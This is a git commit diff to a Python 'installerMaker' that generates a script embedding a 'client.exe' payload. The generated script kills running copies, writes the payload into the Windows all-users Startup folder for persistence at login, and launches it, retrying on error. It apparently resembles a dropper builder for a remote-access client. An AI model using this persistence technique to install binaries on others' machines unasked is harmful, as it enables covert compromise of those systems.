eaefa4ff9d205c239651d4d2e016fd0f53501fdf
gitpetyr <petyrma@icloud.com>
2025-01-19 11:55:38 +0800

    202501191155

--- installerMaker.py
+++ installerMaker.py
@@ -1,17 +1,26 @@
 script=f"""import time,os,psutil
+def main():
+    for process in psutil.process_iter():
+        if process.name()=="client.exe":
+            process.terminate()
+            print("Killed")
+    for process in psutil.process_iter():
+        if process.name()=="client.exe":
+            process.terminate()
+            print("Killed")
+    time.sleep(1)
+    startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe"
+    payload={open("client.exe","rb").read()}
+    open(startup_path,"wb").write(payload)
+    print("Installed")
+    os.startfile("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe")
+    print("Started")
 if __name__=='__main__':
     try:
-        for process in psutil.process_iter():
-            if process.name()=="client.exe":
-                process.terminate()
-        startup_path="C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe"
-        payload={open("client.exe","rb").read()}
-        open(startup_path,"wb").write(payload)
-        print("Installed")
-        os.startfile("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/client.exe")
-        print("Started")
+        main()
     except Exception as e:
         print(e)
+        main()
     finally:
         time.sleep(10)
 """
